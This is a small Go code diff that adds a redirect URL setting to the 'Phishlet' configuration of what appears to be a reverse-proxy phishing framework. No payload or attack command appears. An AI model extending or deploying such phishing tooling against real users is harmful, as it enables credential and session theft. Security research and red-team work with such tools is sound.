@@ -110,6 +110,7 @@ type Phishlet struct {
 	Path             string
 	Author           string
 	Version          PhishletVersion
+	RedirectUrl      string
 	minVersion       string
 	proxyHosts       []ProxyHost
 	domains          []string
@@ -218,6 +219,7 @@ type ConfigIntercept struct {
 
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
+	RedirectUrl string             `mapstructure:"redirect_url"`
 	Params      *[]ConfigParam     `mapstructure:"params"`
 	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
 	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
@@ -281,6 +283,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	p.Path = path
 	p.ParentName = ""
 	p.Author = c.GetString("author")
+	p.RedirectUrl = c.GetString("redirect_url")
 	p.Version, err = p.parseVersion(c.GetString("min_ver"))
 	if err != nil {
 		return err
